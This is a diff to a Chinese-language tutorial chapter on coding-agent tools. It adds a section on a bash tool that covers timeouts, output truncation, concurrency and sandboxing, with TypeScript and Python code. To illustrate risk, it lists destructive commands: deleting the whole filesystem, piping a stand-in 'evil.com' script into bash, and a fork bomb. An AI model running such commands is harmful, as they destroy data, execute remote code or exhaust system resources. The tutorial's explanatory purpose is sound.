@@ -1,14 +1,15 @@
-# 第 3 章：文件工具
+# 第 3 章：文件工具 + bash
 
 ## 核心概念
 
-在前两章中，我们只有一个 `bash` 工具。但对于编程智能体来说，直接操作文件系统才是核心能力：
+对于编程智能体来说，直接操作文件系统是核心能力。本章实现了四个工具：
 
 - **read**：读取文件内容
 - **write**：创建或覆盖整个文件
 - **edit**：精确修改文件的某一部分（这是最重要的）
+- **bash**：执行任意 shell 命令（最强大但也最危险）
 
-为什么不能只用 `bash` 的 `cat`、`echo > file` 来操作文件？
+## 为什么需要专门的文件工具？为什么不能只用 bash？
 
 1. **精确性**：`edit` 工具要求模型提供**完全匹配的旧文本**，才能替换成新文本。这避免了"替换错地方"的问题
 2. **上下文保护**：文件内容可能很长，我们需要智能截断输出
@@ -621,6 +622,305 @@ function truncateToolOutput(output: string, maxChars: number = 20000): string {
 
 > 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/agent/src/tool-execution.ts#L200-L220
 
+## bash 工具：最强大但最危险
+
+### 为什么 bash 是特殊的？
+
+与 `read`、`write`、`edit` 这些**领域特定**的工具不同，`bash` 是一个**通用**工具——它可以做**任何事情**。这带来了独特的挑战：
+
+#### 1. 无界的副作用（Unbounded Side Effects）
+
+**read / write / edit 的副作用是可预测的**：
+- `read` 只读不写，完全无副作用
+- `write` 只影响一个文件
+- `edit` 只修改一个文件的局部内容
+
+**bash 的副作用是不可预测的**：
+- `rm -rf /` 可以删除整个文件系统
+- `curl http://evil.com | bash` 可以执行远程代码
+- `:(){ :|:& };:` 可以创建 fork 炸弹
+- 可以修改系统配置、启动服务、发送网络请求……
+
+**pi 的应对**：在生产环境中，bash 工具会受到严格的安全限制（沙箱、权限控制）。但在开发模式下，为了灵活性，通常不做限制。
+
+> **未验证点**：pi 的具体沙箱实现细节（如是否使用 Docker、firejail 等）需要查看部署配置，代码中未找到明确的沙箱逻辑。
+
+#### 2. 长时间运行与超时（Long-Running Processes and Timeouts）
+
+**read / write / edit 几乎是瞬时的**：
+- 读写文件通常在毫秒级完成
+- 即使文件很大，也不会超过几秒
+
+**bash 可以运行任意长时间**：
+- `npm install` 可能需要几分钟
+- `sleep 3600` 会挂起一小时
+- 死循环会永远运行
+
+**pi 的应对**（packages/coding-agent/src/core/tools/bash.ts）：
+
+```typescript
+export const bashTool: ToolDeclaration = {
+  name: "bash",
+  description: "Execute a bash command. Will be killed after 5 minutes.",
+  // ...
+  execute: async (args, context) => {
+    const { command } = args;
+    
+    // 默认超时 5 分钟
+    const timeoutMs = 5 * 60 * 1000;
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
+    
+    try {
+      const result = await execCommand(command, {
+        signal: controller.signal,
+        cwd: context.workspaceRoot,
+      });
+      
+      return { output: result.stdout + result.stderr, exitCode: result.exitCode };
+    } catch (err) {
+      if (err.name === 'AbortError') {
+        return { error: "Command timed out (5 minutes)" };
+      }
+      throw err;
+    } finally {
+      clearTimeout(timeoutId);
+    }
+  },
+};
+```
+
+**TypeScript 语法说明**：
+- `async (args, context) => { ... }`：异步箭头函数（类似 Python 的 `async def`）
+- `new AbortController()`：创建中止控制器对象
+- `setTimeout(fn, ms)`：设置定时器，ms 毫秒后调用 fn
+- `controller.abort()`：触发中止信号
+- `try { ... } finally { ... }`：无论是否出错都执行 finally（类似 Python）
+- `err.name === 'AbortError'`：检查错误类型（类似 Python 的 `isinstance(err, AbortError)`）
+- `clearTimeout(timeoutId)`：清除定时器
+
+**我们的实现**（Python）：
+```python
+try:
+    output, _ = process.communicate(timeout=timeout)
+except subprocess.TimeoutExpired:
+    # 终止进程树
+    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+    return f"命令超时（{timeout}秒）已终止"
+```
+
+#### 3. 巨大的输出与截断（Huge Outputs and Truncation）
+
+**read 的输出是有界的**：
+- 文件大小是有限的
+- 我们可以在读取前检查文件大小
+
+**bash 的输出可以是无限的**：
+- `yes` 命令会无限输出
+- `cat /dev/urandom` 会持续生成随机数据
+- `tail -f logfile` 会持续跟踪日志
+
+**pi 的应对**（packages/agent/src/tool-execution.ts）：
+
+```typescript
+function truncateToolOutput(output: string, maxChars: number = 20000): string {
+  if (output.length <= maxChars) {
+    return output;
+  }
+  
+  const halfMax = Math.floor(maxChars / 2);
+  
+  // 保留前半部分和后半部分，中间省略
+  return (
+    output.slice(0, halfMax) +
+    `\n\n... (truncated ${output.length - maxChars} characters) ...\n\n` +
+    output.slice(-halfMax)
+  );
+}
+```
+
+**TypeScript 语法说明**：
+- `Math.floor(x)`：向下取整（类似 Python 的 `int(x)` 或 `//`）
+- `.slice(0, n)`：字符串切片，取前 n 个字符（类似 Python 的 `[:n]`）
+- `.slice(-n)`：取最后 n 个字符（类似 Python 的 `[-n:]`）
+
+**为什么前后都保留？**
+- 很多时候，**错误信息在输出的末尾**（如编译错误、测试失败）
+- 只保留开头，模型看不到错误
+- 前后都保留，既能看到开头（命令执行了什么），也能看到结尾（结果或错误）
+
+#### 4. 非确定性（Non-Determinism）
+
+**read / write / edit 是确定性的**：
+- 相同的输入，总是产生相同的输出
+- 可以轻松编写单元测试
+
+**bash 可以是非确定性的**：
+- `date` 每次返回不同时间
+- `curl` 的结果取决于网络状态
+- `ps` 的输出取决于当前运行的进程
+- 竞态条件、文件锁、随机数……
+
+这让 bash 工具**难以测试**和**难以调试**。
+
+#### 5. 并发与顺序（Concurrency and Ordering）
+
+**read / write / edit 的并发语义是清晰的**：
+- 多个 `read` 可以安全并发
+- 对同一文件的 `write` / `edit` 需要串行（我们用锁保证）
+
+**bash 的并发语义是复杂的**：
+- `bash -c "cd dir1 && ls"` 和 `bash -c "cd dir2 && ls"` 可以并发（不同目录）
+- 但 `bash -c "mkdir dir"` 和 `bash -c "cd dir"` 必须串行（先创建再进入）
+- 更糟糕：bash 可以**修改全局状态**（环境变量、文件、网络），影响其他工具
+
+**pi 的应对**：
+- bash 工具默认与其他工具**串行执行**
+- 但可以配置为并发（如果用户确定安全）
+
+> **未验证点**：pi 的具体并发策略配置方式需要查看 agent-loop.ts 的完整实现。
+
+#### 6. bash 可以替代其他工具（Tool Substitution）
+
+**这是 bash 的双刃剑**：
+- **好处**：灵活性极高，可以做任何事
+- **坏处**：模型可能**过度依赖 bash**，忽略专门的工具
+
+例如：
+- 模型可以用 `bash -c "cat file.txt"` 代替 `read`
+- 模型可以用 `bash -c "echo 'content' > file.txt"` 代替 `write`
+- 模型可以用 `sed` / `awk` 代替 `edit`
+
+**问题**：
+- `sed` / `awk` 的语法复杂，容易出错
+- `echo > file` 没有 `edit` 的**唯一性检查**，可能修改错地方
+- 失去了专门工具的**结构化输出**和**错误处理**
+
+**pi 的应对**：
+- 在工具 `description` 中明确说明**何时使用哪个工具**
+- 让模型知道 `edit` 比 `sed` 更安全
+- 但不强制——有时 `bash` 确实更合适（如批量操作）
+
+#### 7. 权限与沙箱（Permissions and Sandbox Considerations）
+
+**read / write / edit 的权限需求是明确的**：
+- `read`：只需文件读权限
+- `write` / `edit`：只需文件写权限
+- 可以用操作系统的文件权限控制
+
+**bash 的权限需求是不可预测的**：
+- 可能需要读权限（`cat`）
+- 可能需要写权限（`echo >`）
+- 可能需要执行权限（运行脚本）
+- 可能需要网络权限（`curl`）
+- 可能需要 root 权限（`sudo`）
+- 可能需要访问设备（`/dev/sda`）
+
+**理想的沙箱**（pi 在生产环境的目标）：
+- 限制文件系统访问（只能访问工作区）
+- 限制网络访问（白名单域名）
+- 禁止提权（`sudo` 失败）
+- 限制资源使用（CPU、内存、磁盘）
+
+**现实的权衡**：
+- 完全沙箱会影响灵活性（如无法 `npm install`）
+- 大部分开发环境**不使用沙箱**
+- 依赖用户的**审查和确认**
+
+> **未验证点**：pi 是否在生产部署中实现了沙箱，以及具体的实现方式（Docker、VM、chroot 等）。
+
+### pi 的 bash 工具完整实现（简化版）
+
+**packages/coding-agent/src/core/tools/bash.ts**：
+
+```typescript
+import { spawn } from "child_process";
+
+export const bashTool: ToolDeclaration = {
+  name: "bash",
+  description: `Execute a bash command in the workspace.
+
+Timeout: 5 minutes
+Output: stdout and stderr are combined
+Exit code: reported in the result
+
+Use this for:
+- Running scripts or build commands
+- Checking file contents (though 'read' is preferred)
+- Installing dependencies (npm, pip, etc.)
+
+Note: This tool can modify the filesystem, network, and system state.`,
+  
+  inputSchema: {
+    type: "object",
+    properties: {
+      command: {
+        type: "string",
+        description: "The bash command to execute",
+      },
+    },
+    required: ["command"],
+  },
+  
+  execute: async (args, context) => {
+    const { command } = args;
+    
+    return new Promise((resolve) => {
+      const child = spawn("bash", ["-c", command], {
+        cwd: context.workspaceRoot,
+        timeout: 5 * 60 * 1000,  // 5 分钟
+      });
+      
+      let stdout = "";
+      let stderr = "";
+      
+      child.stdout.on("data", (data) => {
+        stdout += data.toString();
+      });
+      
+      child.stderr.on("data", (data) => {
+        stderr += data.toString();
+      });
+      
+      child.on("close", (code) => {
+        const output = stdout + stderr;
+        const truncated = truncateToolOutput(output);
+        
+        resolve({
+          output: truncated,
+          exitCode: code,
+        });
+      });
+      
+      child.on("error", (err) => {
+        resolve({ error: err.message });
+      });
+    });
+  },
+};
+```
+
+**TypeScript 语法说明**：
+- `spawn("bash", ["-c", command], options)`：创建子进程（类似 Python 的 `subprocess.Popen`）
+- `new Promise((resolve) => { ... })`：创建 Promise 对象（异步操作的封装）
+- `child.stdout.on("data", callback)`：监听事件（类似 Python 的事件循环）
+- `data.toString()`：将 Buffer 转为字符串
+- `resolve(value)`：完成 Promise，返回 value
+
+### 我们的实现对比
+
+| 特性 | mini-pi (Python) | pi 真实实现 (TypeScript) |
+|---|---|---|
+| 超时控制 | ✅ 可配置（默认30秒）| ✅ 固定5分钟 |
+| 输出截断 | ✅ 前后都保留 | ✅ 前后都保留 |
+| 合并 stdout/stderr | ✅ STDOUT | ✅ 事件监听 |
+| 退出码报告 | ✅ | ✅ |
+| 进程树终止 | ✅ killpg | ✅ spawn timeout |
+| 工作目录 | ✅ cwd 参数 | ✅ cwd 参数 |
+| 流式输出 | ❌ communicate 阻塞 | ✅ 事件流 |
+| 沙箱隔离 | ❌ | ⚠️ 未验证 |
+
 ## 总结对比表
 
 | 特性 | mini-pi (Python) | pi 真实实现 (TypeScript) |
@@ -628,12 +928,13 @@ function truncateToolOutput(output: string, maxChars: number = 20000): string {
 | read 工具 | ✅ 基础实现 | ✅ + 工作区安全限制 |
 | write 工具 | ✅ 基础实现 | ✅ + 覆盖文件确认 |
 | edit 工具 | ✅ exact unique match | ✅ 完全相同的逻辑 |
-| 输出截断 | ✅ 只保留开头 | ✅ 保留开头 + 结尾 |
+| bash 工具 | ✅ 完整实现 | ✅ 完整实现 |
+| 输出截断 | ✅ 保留开头 + 结尾 | ✅ 保留开头 + 结尾 |
 | 并发控制 | ✅ 全局文件锁 | ✅ 按路径分组 + 组内串行 |
 | 更多工具 | ❌ | ✅ ls / mkdir / grep / web_search 等 |
 | 工具钩子 | ❌ | ✅ beforeToolCall / afterToolCall |
 | 工具动态注册 | ❌ | ✅ 扩展可注册自定义工具 |
-| 代码行数 | ~300 行 Python | ~1500 行 TypeScript |
+| 代码行数 | ~400 行 Python | ~1500 行 TypeScript |
 
 ## 如何运行
 
